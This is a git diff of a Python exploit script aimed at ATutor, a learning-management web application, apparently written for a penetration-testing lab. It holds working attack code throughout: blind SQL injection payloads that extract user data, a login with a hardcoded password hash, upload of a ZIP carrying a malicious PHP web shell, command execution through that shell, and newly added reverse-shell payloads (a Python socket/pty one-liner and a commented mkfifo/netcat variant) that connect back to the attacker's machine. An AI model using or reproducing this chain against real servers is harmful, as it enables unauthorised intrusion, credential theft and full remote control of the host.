@@ -1,5 +1,4 @@
-import sys
-import re
+import sys, re, os
 import requests
 import hashlib
 from bs4 import BeautifulSoup
@@ -23,7 +22,8 @@ def searchFriends_sqli(ip, inj_str):
         return True
 
 def extract_data(ip, inj):
-    template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
+    # template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
+    print(f"Extracting data with inj string: {inj}......")
 
     output = "" # If we already have stuff, can start output with value and change starting i
     for i in range(1,100):
@@ -31,7 +31,7 @@ def extract_data(ip, inj):
         for c in ascii_list: # ASCII letters, numbers and punctuation
             query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
             res = searchFriends_sqli(ip, query_string)
-            print(f"Checking {chr(c)}: {query_string} -- {res}")
+            # print(f"Checking {chr(c)}: {query_string} -- {res}")
             if res == True:
                 new_character = True
                 output += chr(c)
@@ -78,6 +78,7 @@ def login(ip, username, user_hash):
 
     if re.search("Invalid login/password combination.",res):
         raise Exception("Invalid Login!")
+    print("Login Successful!")
     return s
 
 def build_zip():
@@ -106,15 +107,26 @@ def upload_zip(ip, session):
         }
 
         r = session.post(target,files=files, data=data)
-        res = r.text
 
+        if 'XML error' not in r.text:
+            raise "File Upload Failure"
+    print("File Upload Success!")
     return True
 
 def send_command(ip, session, command):
     target = f"http://{ip}/ATutor/mods/poc.php5?cmd={command}"
     r = session.get(target)
-    
+
     return r.text
+
+def send_reverse_shell(ip, session):
+    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+    LPORT = 80
+
+    # payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+    payload = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+    print(f"Reverse shell payload: payload")
+    send_command(ip, session, payload)
 
 def main():
     if len(sys.argv) != 2:
@@ -124,7 +136,7 @@ def main():
 
     ip = sys.argv[1]
 
-    username_injection_string = "select/**/login/**/FROM/**/AT_members"
+    username_injection_string = "select/**/login/**/FROM/**/AT_members/**/LIMIT/**/1"
     # username = extract_data(ip, username_injection_string)
     username = "teacher"
 
@@ -133,6 +145,7 @@ def main():
     hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
     print(f"Extracted Credentials: {username}, {hash}")
 
+    print(f"Logging in as user {username}......")
     session = login(ip, username, hash)
 
     # Main page
@@ -143,16 +156,24 @@ def main():
     link = re.findall('href="(bounce.php?.*)"', text)
     if len(link) == 0:
         raise "No valid course!"
+    print(f"Visiting intermediate link: {link[0]}")
 
     # Visit the bounce.php link to choose the course
     r = session.get(f"http://{ip}/ATutor/{link[0]}")
 
     # Upload zip file with malicious PHP
+    print("Uploading ZIP file with malicios PHP file......")
     upload_zip(ip, session)
 
     # Send command to our uploaded reverse shell
-    resp = send_command(ip, session, 'whoami')
-    print(resp)
+    # Use ifconfig to test that reverse shell is working
+    resp = send_command(ip, session, 'ifconfig')
+    if '127.0.0.1' not in resp:
+        raise "Remote Code Execution Failure!"
+    print("Remote Code Execution working!")
+
+    print("Sending reverse shell... Ensure netcat listening on port 80")
+    resp = send_reverse_shell(ip, session)
 
 if __name__ == "__main__":
     main()
